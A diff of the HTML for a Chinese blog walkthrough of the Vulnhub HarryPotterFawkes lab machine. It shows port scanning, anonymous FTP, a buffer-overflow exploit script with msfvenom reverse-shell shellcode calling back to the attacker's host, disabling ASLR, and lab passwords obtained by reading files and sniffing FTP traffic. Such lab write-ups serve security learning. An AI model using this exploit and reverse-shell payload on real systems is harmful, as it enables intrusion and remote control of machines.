@@ -126,30 +126,12 @@
         <li><a class="icon" aria-label="下一篇" href="/2022/04/16/CISCN2019%20%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA%20Web11/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
         
         <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
-        <li><a class="icon" aria-label="分享文章" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
       </ul>
       <span id="i-prev" class="info" style="display:none;">上一篇</span>
       <span id="i-next" class="info" style="display:none;">下一篇</span>
       <span id="i-top" class="info" style="display:none;">返回顶部</span>
-      <span id="i-share" class="info" style="display:none;">分享文章</span>
     </span>
     <br/>
-    <div id="share" style="display: none">
-      <ul>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://hdfzzf.github.io/2022/04/16/12%20Vulnhub%20HarryPotterFawkes%20Writeup/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://hdfzzf.github.io/2022/04/16/12%20Vulnhub%20HarryPotterFawkes%20Writeup/&text=12 Vulnhub HarryPotterFawkes Writeup"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://hdfzzf.github.io/2022/04/16/12%20Vulnhub%20HarryPotterFawkes%20Writeup/&title=12 Vulnhub HarryPotterFawkes Writeup"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://hdfzzf.github.io/2022/04/16/12%20Vulnhub%20HarryPotterFawkes%20Writeup/&is_video=false&description=12 Vulnhub HarryPotterFawkes Writeup"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=12 Vulnhub HarryPotterFawkes Writeup&body=Check out this article: https://hdfzzf.github.io/2022/04/16/12%20Vulnhub%20HarryPotterFawkes%20Writeup/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://hdfzzf.github.io/2022/04/16/12%20Vulnhub%20HarryPotterFawkes%20Writeup/&title=12 Vulnhub HarryPotterFawkes Writeup"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://hdfzzf.github.io/2022/04/16/12%20Vulnhub%20HarryPotterFawkes%20Writeup/&title=12 Vulnhub HarryPotterFawkes Writeup"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://hdfzzf.github.io/2022/04/16/12%20Vulnhub%20HarryPotterFawkes%20Writeup/&title=12 Vulnhub HarryPotterFawkes Writeup"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://hdfzzf.github.io/2022/04/16/12%20Vulnhub%20HarryPotterFawkes%20Writeup/&title=12 Vulnhub HarryPotterFawkes Writeup"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://hdfzzf.github.io/2022/04/16/12%20Vulnhub%20HarryPotterFawkes%20Writeup/&name=12 Vulnhub HarryPotterFawkes Writeup&description=&lt;p&gt;该靶机难度为高，主要的难点在于缓冲区溢出漏洞的利用以及堆溢出漏洞攻击。其次在于FTP服务攻击和流量抓包分析，这两者在之前的靶机中从没遇到过。&lt;/p&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://hdfzzf.github.io/2022/04/16/12%20Vulnhub%20HarryPotterFawkes%20Writeup/&t=12 Vulnhub HarryPotterFawkes Writeup"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
-</ul>
-
-    </div>
     <div id="toc">
       <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%9D%B6%E6%9C%BA%E4%BF%A1%E6%81%AF"><span class="toc-number">1.</span> <span class="toc-text">1 靶机信息</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B8%97%E9%80%8F"><span class="toc-number">2.</span> <span class="toc-text">2 渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1%E5%8F%91%E7%8E%B0"><span class="toc-number">2.1.</span> <span class="toc-text">2.1 主机发现、端口扫描、端口服务发现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%BF%E9%97%AEhttp%E6%9C%8D%E5%8A%A1"><span class="toc-number">2.2.</span> <span class="toc-text">2.2 访问http服务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%BF%E9%97%AEftp%E6%9C%8D%E5%8A%A1"><span class="toc-number">2.3.</span> <span class="toc-text">2.3 访问ftp服务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.4.</span> <span class="toc-text">2.4 缓冲区溢出漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E6%89%BE%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.4.1.</span> <span class="toc-text">2.4.1 查找漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.4.2.</span> <span class="toc-text">2.4.2 利用漏洞</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.5.</span> <span class="toc-text">2.5 信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">2.6.</span> <span class="toc-text">2.6 权限提升</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">3.</span> <span class="toc-text">3 总结</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#aslr%E6%8A%80%E6%9C%AF"><span class="toc-number">3.1.</span> <span class="toc-text">3.1 ASLR技术</span></a></li></ol></li></ol>
     </div>
@@ -176,8 +158,6 @@
     <div class="postdate">
       
         <time datetime="2022-04-15T16:00:00.000Z" itemprop="datePublished">2022-04-16</time>
-        
-        (Updated: <time datetime="2022-04-17T01:14:14.584Z" itemprop="dateModified">2022-04-17</time>)
         
       
     </div>
@@ -241,9 +221,7 @@
 </ul>
 <h1 id="渗透">2 渗透</h1>
 <h2 id="主机发现端口扫描端口服务发现">2.1 主机发现、端口扫描、端口服务发现</h2>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> arp-scan -l
-<span class="token function">sudo</span> nmap -p- <span class="token number">10.0</span>.2.16
-<span class="token function">sudo</span> nmap -p21,22,80,2222,9898 -A <span class="token number">10.0</span>.2.16<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">sudo nmap -p- 10.0.2.16</span><br><span class="line">sudo nmap -p21,22,80,2222,9898 -A 10.0.2.16</span><br></pre></td></tr></table></figure>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416151956.png" /></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416152011.png" /></p>
 <p>信息如下：</p>
@@ -261,14 +239,12 @@
 <p>因此尝试进行路径扫描，也没有什么有用的发现</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416152340.png" /></p>
 <h2 id="访问ftp服务">2.3 访问ftp服务</h2>
-<p>在http上没有有用的发现，接下来直接利用ftp匿名登录上去，并下载对应的那个文件。 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ftp</span> <span class="token number">10.0</span>.2.16 <span class="token number">21</span>
-用户名输入：anonymous
-密码为空，直接enter<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></p>
+<p>在http上没有有用的发现，接下来直接利用ftp匿名登录上去，并下载对应的那个文件。 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ftp 10.0.2.16 21</span><br><span class="line">用户名输入：anonymous</span><br><span class="line">密码为空，直接enter</span><br></pre></td></tr></table></figure></p>
 <p>登录进去之后，利用<code>get server_hogwarts</code>下载对应文件到本地，接下来我想查看一下其他目录的东西，发现除了下载对应的文件，不能进行任何操作。</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416153338.png" /></p>
 <h2 id="缓冲区溢出漏洞">2.4 缓冲区溢出漏洞</h2>
 <p>到目前为止，http服务没信息，ssh没有用户和密码，9898都不知道什么服务，只有刚刚下载的一个文件，先查看一下文件类型</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">file</span> server_hogwarts<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file server_hogwarts</span><br></pre></td></tr></table></figure>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416153531.png" /></p>
 <p>信息：</p>
 <ul>
@@ -288,22 +264,15 @@
 </blockquote>
 <p>查看是否开启：（0是禁用；1，2表示开启，2是在1的基础上进一步打开堆地址随机化）</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416155246.png" /></p>
-<p>输入以下命令禁用： <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> root <span class="token comment"># 需要先切换到root才可以，否则权限不够</span>
-<span class="token builtin class-name">echo</span> <span class="token number">0</span> <span class="token operator">></span> <span class="token builtin class-name">echo</span> <span class="token number">0</span> <span class="token operator">></span> /proc/sys/kernel/randomize_va_space<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></p>
-<p>利用图形化工具edb-debugger进行查找。 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> edb-debugger <span class="token comment"># 安装</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>输入以下命令禁用： <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo root <span class="comment"># 需要先切换到root才可以，否则权限不够</span></span><br><span class="line"><span class="built_in">echo</span> 0 &gt; <span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure></p>
+<p>利用图形化工具edb-debugger进行查找。 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install edb-debugger <span class="comment"># 安装</span></span><br></pre></td></tr></table></figure></p>
 <h3 id="查找漏洞">2.4.1 查找漏洞</h3>
 <p>生成一个300个A的字符串，然后输入到唯一的功能点中，发现edb-debugger提示出错了</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416155927.png" /></p>
-<p>说明这里确实存在漏洞，接下来生成不重复的字符串判断一下是哪几个A出现在了EIP寄存器中。 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msf-pattern_create -l <span class="token number">300</span>
-
-Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></p>
+<p>说明这里确实存在漏洞，接下来生成不重复的字符串判断一下是哪几个A出现在了EIP寄存器中。 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf-pattern_create -l 300</span><br><span class="line"></span><br><span class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9</span><br></pre></td></tr></table></figure></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416160325.png" /></p>
-<p>此时EIP中的值为<code>64413764</code>，即<code>d7Ad</code>（注意需要反过来），然后查找该子串在原来字符串中的偏移量 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msf-pattern_offset
-
-Exact match at offset <span class="token number">112</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></p>
-<p>生成字符串确定一下： <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python3 -c <span class="token string">"print('A'*112 + 'hdfs' + 'C'*50)"</span>
-
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAhdfsCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></p>
+<p>此时EIP中的值为<code>64413764</code>，即<code>d7Ad</code>（注意需要反过来），然后查找该子串在原来字符串中的偏移量 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf-pattern_offset</span><br><span class="line"></span><br><span class="line">Exact match at offset 112</span><br></pre></td></tr></table></figure></p>
+<p>生成字符串确定一下： <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&quot;print(&#x27;A&#x27;*112 + &#x27;hdfs&#x27; + &#x27;C&#x27;*50)&quot;</span></span><br><span class="line"></span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAhdfsCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC</span><br></pre></td></tr></table></figure></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416162156.png" /></p>
 <p>成功找到漏洞所在。那么该如何利用呢？这里不像之前，不存在有漏洞的函数可以利用。首先得知道一个基础知识：</p>
 <blockquote>
@@ -315,33 +284,14 @@ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 </blockquote>
 <p>（我对汇编不熟悉）简单说下我的理解：如果存在漏洞的函数，可以将EIP中的值修改为对应函数的地址，然后CPU就会自动执行存在漏洞的函数。像该靶机，不存在漏洞函数，可以通过EIP让CPU执行ESP寄存器中的指令，即<code>jmp esp</code>指令。我们提前在ESP中写入反弹shell的指令（可以用msf生成）。</p>
 <h3 id="利用漏洞">2.4.2 利用漏洞</h3>
-<p>从查找漏洞的过程来看，ESP寄存器是可写入的，并且会将EIP之后的内容（即hdfs之后的内容）全部写入ESP。因此，我们先利用msf生成反弹shell的指令： <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfvenom -p linux/x86/shell_reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token number">10.0</span>.2.4 <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">4444</span> -b <span class="token string">"<span class="token entity" title="\x00">\x00</span>"</span> -f py <span class="token comment"># 生成python可利用的</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>从查找漏洞的过程来看，ESP寄存器是可写入的，并且会将EIP之后的内容（即hdfs之后的内容）全部写入ESP。因此，我们先利用msf生成反弹shell的指令： <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.2.4 LPORT=4444 -b <span class="string">&quot;\x00&quot;</span> -f py <span class="comment"># 生成python可利用的</span></span><br></pre></td></tr></table></figure></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416163915.png" /></p>
 <p>然后查找<code>jmp esp</code>指令的地址，利用<code>Plugins-&gt;Opcode Search</code></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416164843.png" /></p>
 <p>要找到可执行权限的进程，然后<code>ESP-&gt;EIP</code>（个人理解：将ESP指令传给EIP）</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416164946.png" /></p>
 <p>记住地址，写入payload的时候记得反过来！</p>
-<p>然后编写利用脚本： <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#! /usr/bin/python</span>
-<span class="token keyword">import</span> sys<span class="token punctuation">,</span>socket
-buf <span class="token operator">=</span>  <span class="token string">b""</span>
-buf <span class="token operator">+=</span> <span class="token string">b"\xbb\x77\x58\x1b\xb6\xda\xc6\xd9\x74\x24\xf4\x5a\x2b"</span>
-buf <span class="token operator">+=</span> <span class="token string">b"\xc9\xb1\x12\x31\x5a\x12\x03\x5a\x12\x83\xb5\x5c\xf9"</span>
-buf <span class="token operator">+=</span> <span class="token string">b"\x43\x08\x86\x0a\x48\x39\x7b\xa6\xe5\xbf\xf2\xa9\x4a"</span>
-buf <span class="token operator">+=</span> <span class="token string">b"\xd9\xc9\xaa\x38\x7c\x62\x95\xf3\xfe\xcb\x93\xf2\x96"</span>
-buf <span class="token operator">+=</span> <span class="token string">b"\xc1\x63\x07\x62\xbe\x61\x07\x7b\x62\xef\xe6\xcb\xfc"</span>
-buf <span class="token operator">+=</span> <span class="token string">b"\xbf\xb9\x78\xb2\x43\xb3\x9f\x79\xc3\x91\x37\xec\xeb"</span>
-buf <span class="token operator">+=</span> <span class="token string">b"\x66\xaf\x98\xdc\xa7\x4d\x30\xaa\x5b\xc3\x91\x25\x7a"</span>
-buf <span class="token operator">+=</span> <span class="token string">b"\x53\x1e\xfb\xfd"</span>
-payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">112</span> <span class="token operator">+</span> <span class="token string">'\x55\x9d\x04\x08'</span> <span class="token operator">+</span> <span class="token string">'\x90'</span><span class="token operator">*</span><span class="token number">32</span>  <span class="token operator">+</span> buf
-<span class="token keyword">try</span><span class="token punctuation">:</span>
-    s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span>socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>
-    s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span><span class="token number">9898</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span>
-    s<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
-<span class="token keyword">except</span><span class="token punctuation">:</span>
-    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'something wrong!'</span><span class="token punctuation">)</span>
-    sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
+<p>然后编写利用脚本： <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> sys,socket</span><br><span class="line">buf =  <span class="string">b&quot;&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xbb\x77\x58\x1b\xb6\xda\xc6\xd9\x74\x24\xf4\x5a\x2b&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xc9\xb1\x12\x31\x5a\x12\x03\x5a\x12\x83\xb5\x5c\xf9&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x43\x08\x86\x0a\x48\x39\x7b\xa6\xe5\xbf\xf2\xa9\x4a&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xd9\xc9\xaa\x38\x7c\x62\x95\xf3\xfe\xcb\x93\xf2\x96&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xc1\x63\x07\x62\xbe\x61\x07\x7b\x62\xef\xe6\xcb\xfc&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xbf\xb9\x78\xb2\x43\xb3\x9f\x79\xc3\x91\x37\xec\xeb&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x66\xaf\x98\xdc\xa7\x4d\x30\xaa\x5b\xc3\x91\x25\x7a&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x53\x1e\xfb\xfd&quot;</span></span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span>*<span class="number">112</span> + <span class="string">&#x27;\x55\x9d\x04\x08&#x27;</span> + <span class="string">&#x27;\x90&#x27;</span>*<span class="number">32</span>  + buf</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    s.connect((<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">9898</span>))</span><br><span class="line">    s.send((payload))</span><br><span class="line">    s.close()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;something wrong!&#x27;</span>)</span><br><span class="line">    sys.exit()</span><br></pre></td></tr></table></figure></p>
 <p>解释：</p>
 <ul>
 <li>最开始的<code>#! /usr/bin/python</code>：当我们输入<code>./exp.py</code>时，默认最开始<code>#!</code>中的执行；</li>
@@ -364,20 +314,13 @@ payload <span class="token operator">=</span> <span class="token string">'A'</sp
 <p>靶机的IP应该是<code>10.0.2.16</code>而不是<code>172.....</code>，并且网卡的名字也很奇怪，怀疑这可能是一个容器，查看根目录下的文件</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416171405.png" /></p>
 <p>确定了我们现在的shell是一个容器的shell。不管它，反正先收集信息就对了。</p>
-<p>首先，在当前目录下发现了一个可能是重要的文件<code>.mycreds.txt</code>，查看其内容： <pre class="line-numbers language-none"><code class="language-none">HarrYp0tter@Hogwarts123<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
-<p>这看起来像是一个密码，不管三七二十一，先尝试一下ssh登录，两个端口的ssh都尝试一下，发现2222端口的登录成功了 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> harry@10.0.2.16 -p <span class="token number">2222</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
-<p>发现还是在容器内🤡，查看一下root目录里面的内容，发现了两个文件，内容分别为： <pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F; note.txt
-Hello Admin!!
-
-We have found that someone is trying to login to our ftp server by mistake.You are requested to analyze the traffic and figure out the user.
-
-&#x2F;&#x2F; horcrux1.txt # 这就是第一个flag，horcrux是哈利波特里面的魂器的意思
-horcrux_&#123;NjogSGFSclkgUG90VGVyIGRFc1RyT3llZCBieSB2b2xEZU1vclQ&#x3D;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
+<p>首先，在当前目录下发现了一个可能是重要的文件<code>.mycreds.txt</code>，查看其内容： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HarrYp0tter@Hogwarts123</span><br></pre></td></tr></table></figure></p>
+<p>这看起来像是一个密码，不管三七二十一，先尝试一下ssh登录，两个端口的ssh都尝试一下，发现2222端口的登录成功了 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh harry@10.0.2.16 -p 2222</span><br></pre></td></tr></table></figure></p>
+<p>发现还是在容器内🤡，查看一下root目录里面的内容，发现了两个文件，内容分别为： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// note.txt</span><br><span class="line">Hello Admin!!</span><br><span class="line"></span><br><span class="line">We have found that someone is trying to login to our ftp server by mistake.You are requested to analyze the traffic and figure out the user.</span><br><span class="line"></span><br><span class="line">// horcrux1.txt # 这就是第一个flag，horcrux是哈利波特里面的魂器的意思</span><br><span class="line">horcrux_&#123;NjogSGFSclkgUG90VGVyIGRFc1RyT3llZCBieSB2b2xEZU1vclQ=&#125;</span><br></pre></td></tr></table></figure></p>
 <p>base64解码：</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416173101.png" /></p>
 <p>需要关注的是<code>note.txt</code>中的内容，大致的意思是：有人尝试登录ftp服务器，但是出错了，要求我们用流量分析的方法找到那人是谁。</p>
-<p>利用工具<code>tcpdump</code>分析流量： <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> /bin/sh <span class="token comment"># 切换到root</span>
-tcpdump -i eth0 port <span class="token number">21</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></p>
+<p>利用工具<code>tcpdump</code>分析流量： <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo /bin/sh <span class="comment"># 切换到root</span></span><br><span class="line">tcpdump -i eth0 port 21</span><br></pre></td></tr></table></figure></p>
 <p>过了一会开始有了数据包：</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416175319.png" /></p>
 <p>前面的3个为tcp握手过程，注意红框中的信息：</p>
@@ -387,72 +330,25 @@ tcpdump -i eth0 port <span class="token number">21</span><span aria-hidden="true
 <li>第三个红框：ftp语法，PASS后面跟的是密码</li>
 <li>第四个红框：登陆失败</li>
 </ul>
-<p>又获得一个用户名和密码： <pre class="line-numbers language-none"><code class="language-none">username: neville
-password: bL!Bsg3k<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></p>
